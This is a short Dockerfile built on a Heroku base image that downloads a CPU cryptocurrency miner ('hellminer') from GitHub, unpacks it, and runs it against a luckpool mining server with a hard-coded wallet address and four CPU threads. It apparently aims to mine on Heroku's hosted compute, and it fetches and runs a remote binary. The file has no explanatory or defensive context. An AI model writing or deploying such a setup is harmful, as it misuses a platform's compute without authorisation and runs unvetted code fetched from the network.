FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
RUN tar -xzvf hellminer_cpu_linux.tar.gz
RUN ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RQ49i5erGDL5XnpUEjKksn9SvdES8qjsow.RD2 -p x --cpu 4
CMD bash heroku.sh
